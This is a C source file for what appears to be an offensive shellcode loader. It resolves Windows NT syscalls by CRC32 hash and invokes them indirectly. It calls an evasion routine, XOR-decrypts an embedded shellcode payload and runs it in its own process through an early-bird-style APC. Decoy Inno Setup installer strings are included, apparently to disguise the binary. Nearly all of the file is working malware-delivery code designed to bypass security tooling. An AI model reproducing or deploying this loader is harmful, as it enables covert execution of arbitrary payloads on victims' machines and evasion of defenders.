#include <stdio.h>
#include "EarlyBirdAPC-InDirectSyscalls.h"
#include "Evasion.h"
#include "Structs.h"
#include "HellsHall.h"

//CRC32 Hashes for syscalls
#define NtCreateSection_CRC32            0x9EEE4B80
#define NtMapViewOfSection_CRC32         0xA4163EBC
#define NtUnmapViewOfSection_CRC32       0x90483FF6
#define NtClose_CRC32                    0x0D09C750
#define NtOpenProcess_CRC32              0xDBF381B5
#define NtQueueApcThread_CRC32           0x235B0390
#define NtResumeThread_CRC32             0x6273B572
#define NtProtectVirtualMemory_CRC32     0x5C2D1A97
#define NtWaitForSingleObject_CRC32      0xDD554681

// a structure to keep the used sycalls
typedef struct _NTAPI_FUNC
{
    NT_SYSCALL	NtOpenProcess;
    NT_SYSCALL	NtCreateSection;
    NT_SYSCALL	NtMapViewOfSection;
    NT_SYSCALL	NtUnmapViewOfSection;
	NT_SYSCALL	NtClose;
    NT_SYSCALL	NtQueueApcThread;
	NT_SYSCALL	NtResumeThread;
    NT_SYSCALL  NtProtectVirtualMemory;
	NT_SYSCALL  NtWaitForSingleObject;
} NTAPI_FUNC, * PNTAPI_FUNC;

//global ntdll config structure
NTAPI_FUNC g_Nt = { 0 };

const unsigned char a1[] = "Inno Setup version 5.5.1.ee1 (u) Copyright 1997-2012 Jordan Russell";
const unsigned char a2[] = "Portions Copyright 2000-2012 Martjin Laan";
const unsigned char a3[] = "Setup will install %s into the following folder.";
const unsigned char a4[] = "To continue, click Next. If you would like to select a different folder, click Browse.";
const unsigned char a5[] = "Agree";
const unsigned char a6[] = "Cancel";
const unsigned char a7[] = "At least %s MB of free disk is required.";
const unsigned char a8[] = "Next";
const unsigned char a9[] = "Please read the following License Agreement. You must accept the terms of this agreement before continuing with the installation.";
const unsigned char a0[] = "I accept the agreement";
const unsigned char a11[] = "I do not accept the agreement";
const unsigned char a12[] = "Setup";
const unsigned char a13[] = "It is recommended that you close all other applications before continuing.";
const unsigned char a14[] = "Install";
const unsigned char a15[] = "Modify";
const unsigned char a16[] = "Repair";
const unsigned char a17[] = "Remove";
const unsigned char a18[] = "Click Next to continue, or Cancel to exit Setup.";
const unsigned char a19[] = "Select the components you want to install; clear the components you do not want to install. Click Next when you are ready to continue.";
const unsigned char a20[] = "Full installation";
const unsigned char a21[] = "Minimal installation";
const unsigned char a22[] = "Installation succeeded.";

//XOR Key
unsigned char Key[] = "\x32\x37\x30\x32\x31\x30\x30\x30\x5a\x30\x63\x31\xa4\x38\xfa\xdd";

//shellcode
unsigned char Shellcode[] =
"\xce\x7f\xb3\xd6\xc1\xd8\xf0\x30\x5a\x30\x22\x60\xe5\x68\xa8\x8c\x56\x7a\x06\xe2\x57\x79\xbb\x62\x50\x12\xbb\x31\x29\xec\xb3\xa8\xfd\x48\xb9\x45\x60\x7a\x3e\x87\x7a\x7a\x17\x01\xaa\x79\x95\xf8\x56\xe1\x61\x4e\x35\x1c\x12\x70\xf1\xf9\x3d\x1b\x31\xa2\xd3\x49\x6a\xbb\x8c\x48\xb9\x65\x10\xb9\x73\x0c\x78\x31\x8a\xbb\xe3\xb9\xa4\x38\xfa\x95\x85\xf2\x43\x57\x7a\x30\xe0\x60\xbb\x12\x28\x27\xba\xe4\x18\xb3\xdc\xd0\xd1\x61\x78\xcd\xf8\x71\xbb\x04\xd2\x78\x62\xe7\xe9\x09\x33\x95\x31\xf2\x9b\x71\xf3\xf8\x3d\x71\x31\x9b\x08\x83\x44\x55\x74\xf9\x91\x24\x3a\x72\x09\xe3\x44\xe8\x68\x74\xd1\x70\x47\x78\xa5\xe8\x9c\x9c\x8b\x3e\x7f\x74\xb9\x71\x2c\x79\x31\x8a\x71\xe8\x35\x2c\x70\xfb\x0d\x41\x6a\x76\x68\x6c\x68\x6a\x71\x68\x1b\x69\x22\x6b\xec\xbb\x16\xfd\x41\x60\xc8\xd0\x6a\x70\x69\x6a\x78\xd1\x22\x8a\x66\x5b\xc7\x05\x80\x49\x8c\x40\x43\x00\x6e\x03\x02\x30\x5a\x71\x35\x78\x2d\xde\xb2\x5c\xec\x92\x36\x30\x32\x78\xb9\xd5\x79\xe6\x32\x63\x20\xf8\xf8\x52\xdd\x7a\x73\x63\x79\xbb\xd5\x7c\xb9\xc1\x1b\x8a\x2f\x46\x82\x3f\x05\x08\x4c\xbb\xdd\x58\x33\x30\x30\x30\x69\x1b\x8a\x4a\xb1\xcf\x38\x05\x08\x50\x62\x7a\x01\xfb\x7c\x01\xf0\x78\xa5\xf0\x2b\xb8\x66\x70\x05\x1d\x48\xbb\xf6\x71\x88\xdb\x3f\xef\xd0\xa5\xe5\x2b\xb8\x63\x52\xea\x9c\x58\x7e\xbe\xd2\x7a\xb8\xc9\x71\x8a\xc3\x95\x17\x50\x5b\xed\xb2\x5c\xc4\x72\x35\x30\x32\x78\x88\x53\x5d\x3e\x30\x63\x31\xa4\x38\xbb\x8d\x41\x62\x7f\xb9\xd0\x66\x67\x67\x7d\x6b\xf0\x09\x3c\xfd\x79\xaa\x3f\xfc\x54\xf0\x74\x16\x65\x31\x31\x78\xd7\x74\x47\x29\x62\x38\x92\x95\x89\xd4\x61\x60\x73\x61\x71\x60\x71\x0a\x79\x9c\xf1\xe5\x68\xb3\x22\xc8\x7f\xbe\xf1\x7e\xb8\xf1\x71\x8a\x23\xfc\x5c\xb7\x5b\xed\xb2\xec\xd2\x7a\xc8\xfa\xb9\x3f\x71\x8a\x38\xdd\x2d\x03\xce\x71\x83\x1a\xc0\x2a\x38\x76\x8a\x94\xa4\x8d\xad\xcf\x8f\x78\xe0\xf5\x8c\x04\xfc\xa1\x0a\xb2\xcc\xd0\x47\x34\x8b\x77\x23\x28\x5f\x09\x31\xfd\x79\x73\x07\xff\xe7\x37";

BOOL InitializeNtSyscalls() {

    if (!FetchNtSyscall(NtProtectVirtualMemory_CRC32, &g_Nt.NtProtectVirtualMemory)) {
        printf("[!] Failed In Obtaining The Syscall Number Of NtProtectVirtualMemory \n");
        return FALSE;
    }
    printf("[+] Syscall Number Of NtProtectVirtualMemory Is : 0x%0.2X \n\t\t>> Executing 'syscall' instruction Of Address : 0x%p\n", g_Nt.NtProtectVirtualMemory.dwSSn, g_Nt.NtProtectVirtualMemory.pSyscallInstAddress);


    if (!FetchNtSyscall(NtCreateSection_CRC32, &g_Nt.NtCreateSection)) {
        printf("[!] Failed In Obtaining The Syscall Number Of NtCreateSection \n");
        return FALSE;
    }
    printf("[+] Syscall Number Of NtCreateSection Is : 0x%0.2X \n\t\t>> Executing 'syscall' instruction Of Address : 0x%p\n", g_Nt.NtCreateSection.dwSSn, g_Nt.NtCreateSection.pSyscallInstAddress);


    if (!FetchNtSyscall(NtMapViewOfSection_CRC32, &g_Nt.NtMapViewOfSection)) {
        printf("[!] Failed In Obtaining The Syscall Number Of NtMapViewOfSection \n");
        return FALSE;
    }
    printf("[+] Syscall Number Of NtMapViewOfSection Is : 0x%0.2X \n\t\t>> Executing 'syscall' instruction Of Address : 0x%p\n", g_Nt.NtMapViewOfSection.dwSSn, g_Nt.NtMapViewOfSection.pSyscallInstAddress);


    if (!FetchNtSyscall(NtUnmapViewOfSection_CRC32, &g_Nt.NtUnmapViewOfSection)) {
        printf("[!] Failed In Obtaining The Syscall Number Of NtUnmapViewOfSection \n");
        return FALSE;
    }
    printf("[+] Syscall Number Of NtUnmapViewOfSection Is : 0x%0.2X \n\t\t>> Executing 'syscall' instruction Of Address : 0x%p\n", g_Nt.NtUnmapViewOfSection.dwSSn, g_Nt.NtUnmapViewOfSection.pSyscallInstAddress);

    if (!FetchNtSyscall(NtClose_CRC32, &g_Nt.NtClose)) {
        printf("[!] Failed In Obtaining The Syscall Number Of NtClose \n");
        return FALSE;
    }
    printf("[+] Syscall Number Of NtClose Is : 0x%0.2X \n\t\t>> Executing 'syscall' instruction Of Address : 0x%p\n", g_Nt.NtClose.dwSSn, g_Nt.NtClose.pSyscallInstAddress);

    if (!FetchNtSyscall(NtQueueApcThread_CRC32, &g_Nt.NtQueueApcThread)) {
        printf("[!] Failed In Obtaining The Syscall Number Of NtQueueApcThread \n");
        return FALSE;
    }
    printf("[+] Syscall Number Of NtQueueApcThread Is : 0x%0.2X \n\t\t>> Executing 'syscall' instruction Of Address : 0x%p\n", g_Nt.NtQueueApcThread.dwSSn, g_Nt.NtQueueApcThread.pSyscallInstAddress);

    if (!FetchNtSyscall(NtResumeThread_CRC32, &g_Nt.NtResumeThread)) {
        printf("[!] Failed In Obtaining The Syscall Number Of NtResumeThread \n");
        return FALSE;
    }
    printf("[+] Syscall Number Of NtResumeThread Is : 0x%0.2X \n\t\t>> Executing 'syscall' instruction Of Address : 0x%p\n", g_Nt.NtResumeThread.dwSSn, g_Nt.NtResumeThread.pSyscallInstAddress);

    if (!FetchNtSyscall(NtWaitForSingleObject_CRC32, &g_Nt.NtWaitForSingleObject)) {
        printf("[!] Failed In Obtaining The Syscall Number Of NtWaitForSingleObject \n");
        return FALSE;
    }
    printf("[+] Syscall Number Of NtWaitForSingleObject Is : 0x%0.2X \n\t\t>> Executing 'syscall' instruction Of Address : 0x%p\n", g_Nt.NtWaitForSingleObject.dwSSn, g_Nt.NtWaitForSingleObject.pSyscallInstAddress);


    return TRUE;
}

//XOR routine
VOID XorByInputKey(IN PBYTE pShellcode, IN SIZE_T sShellcodeSize, IN PBYTE bKey, IN SIZE_T sKeySize) {
    for (size_t i = 0, j = 0; i < sShellcodeSize; i++, j++) {
        if (j >= sKeySize) {
            j = 0;
        }
        pShellcode[i] = pShellcode[i] ^ bKey[j];
    }
}

int main()
{
    NTSTATUS	STATUS = NULL;
	SIZE_T      ShellcodeSize = sizeof(Shellcode);
    SIZE_T      viewSize = sizeof(Shellcode);
    ULONG		dwOld = NULL;
    LARGE_INTEGER MaximumSize;
    HANDLE		hProcess = NtCurrentProcess(),	// self injection
                hThread = (HANDLE)-2, //current thread
                hSection = NULL;
    PVOID       pLocalAddress = NULL;
    SIZE_T      alignedSize = (sizeof(Shellcode) + 0x1000 - 1) & ~(0x1000 - 1);
    LARGE_INTEGER interval;
    
	interval.QuadPart = -10000000LL; // 1 second interval for NtWaitForSingleObject

    MaximumSize.HighPart = 0;
    MaximumSize.LowPart = sizeof(Shellcode);

    if (InitEvasion() != 0) {
        return 0xDEADBEEF; // Evasion failed, bailout
    }

    if (!InitializeNtSyscalls()) {
        return 0xBAADF00D; // Failed to initialize syscalls
	}

    //Decryption routine
	XorByInputKey(Shellcode, sizeof(Shellcode), Key, sizeof(Key));

    // allocate memory
    SET_SYSCALL(g_Nt.NtCreateSection);
    if ((STATUS = RunSyscall(&hSection, SECTION_ALL_ACCESS, NULL, &MaximumSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) != 0) {
        printf("[!] NtCreateSection failed with error: 0x%0.8X\n", STATUS);
        return -1;
    }

    // map view in current process
    SET_SYSCALL(g_Nt.NtMapViewOfSection);
    if ((STATUS = RunSyscall(hSection, hProcess, &pLocalAddress, NULL, NULL, NULL, &viewSize, 2, 0, PAGE_EXECUTE_READWRITE)) != 0) {
        printf("[!] NtMapViewOfSection failed with error: 0x%0.8X\n", STATUS);
        return -2;
    }
    
	// copy the shellcode to the local section
    memcpy(pLocalAddress, Shellcode, ShellcodeSize);


	// change protections of the local section to RX
    SET_SYSCALL(g_Nt.NtProtectVirtualMemory);
    if ((STATUS = RunSyscall(hProcess, &pLocalAddress, &viewSize, PAGE_EXECUTE_READ, &dwOld)) != 0) {
        printf("[!] NtProtectVirtualMemory failed with error: 0x%0.8X\n", STATUS);
        return -3;
	}

	// queue the apc
    SET_SYSCALL(g_Nt.NtQueueApcThread);
    if ((STATUS = RunSyscall(hThread, (PAPCFUNC)pLocalAddress, NULL, NULL, NULL)) != 0) {
        printf("[!] NtQueueApcThread failed with error: 0x%0.8X\n", STATUS);
        return -4;
	}

	// trigger the APC via resume thread
	SET_SYSCALL(g_Nt.NtResumeThread);
    if ((STATUS = RunSyscall(hThread, NULL)) != 0) {
        printf("[!] NtResumeThread failed with error: 0x%0.8X\n", STATUS);
        return -5;
    }
    
	// wait for the APC to complete
    SET_SYSCALL(g_Nt.NtWaitForSingleObject);
    if ((STATUS = RunSyscall(hThread, TRUE, &interval)) != 0) {
        printf("[!] NtWaitForSingleObject failed with error: 0x%0.8X\n", STATUS);
        return -6;
    }

    // unmap the view 
    SET_SYSCALL(g_Nt.NtUnmapViewOfSection);
    if ((STATUS = RunSyscall(NtCurrentProcess(), pLocalAddress)) != 0) {
        printf("[!] NtUnmapViewOfSection failed with error: 0x%0.8X\n", STATUS);
        return -7;
    }

	// close the section handle
	SET_SYSCALL(g_Nt.NtClose);
    if ((STATUS = RunSyscall(hSection)) != 0) {
        printf("[!] NtClose failed with error: 0x%0.8X\n", STATUS);
        return -8;
    }
	printf("[+] Shellcode executed successfully.\n");
    return 0;
}